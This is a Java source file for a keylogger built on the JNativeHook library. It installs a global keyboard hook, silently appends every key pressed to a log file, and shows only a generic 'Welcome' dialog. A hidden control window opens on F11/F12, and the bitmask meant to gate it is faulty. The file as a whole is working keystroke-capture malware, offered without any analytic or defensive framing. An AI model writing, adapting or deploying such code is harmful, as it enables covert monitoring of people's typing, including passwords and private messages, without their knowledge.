/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.keylogger.backend;

import com.keylogger.frontend.MainFrame;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Patro
 */
public class KeyLogger implements NativeKeyListener {
    
    private short hotKeyFlag = 0x00;
    private static final short MASK_A = 1 << 0;
    private static final short MASK_W = 1 << 1;
    MainFrame mf = new MainFrame();
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws FileNotFoundException {
        try {  
            GlobalScreen.registerNativeHook();
            JOptionPane.showMessageDialog(null, "Welcome", "TP", JOptionPane.INFORMATION_MESSAGE);
        } catch (NativeHookException ex) {
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    public static void stopLogging() {

    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            Files.write(Paths.get("log.txt"), (NativeKeyEvent.getKeyText(e.getKeyCode())).getBytes(), StandardOpenOption.APPEND);
        } catch (IOException er) {
        }

//        if (e.getKeyCode() == NativeKeyEvent.VC_F12) {
//            try {
//                GlobalScreen.unregisterNativeHook();
//            } catch (NativeHookException ex) {
//                Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
//            }
//        }
        if (e.getKeyCode() == NativeKeyEvent.VC_F11) {
            hotKeyFlag &= MASK_A;

            // Check the mask and do work.
            if (hotKeyFlag == (MASK_A & MASK_W)) {
                mf.showFrame();
            }
        } else if (e.getKeyCode() == NativeKeyEvent.VC_F12) {
            hotKeyFlag &= MASK_W;

            // Check the mask and do work.
            if (hotKeyFlag == (MASK_A & MASK_W)) {
                mf.showFrame();
            }
        }

    }

    public void nativeKeyReleased(NativeKeyEvent e) {
//        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
//        try {
//              Files.write(Paths.get("log.txt"), (NativeKeyEvent.getKeyText(e.getKeyCode())).getBytes(), StandardOpenOption.APPEND);
//        } catch (IOException er) {
//        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
//        try {
//            Files.write(Paths.get("log.txt"), (NativeKeyEvent.getKeyText(e.getKeyCode())).getBytes(), StandardOpenOption.APPEND);
//        } catch (IOException er) {
//        }
    }
}
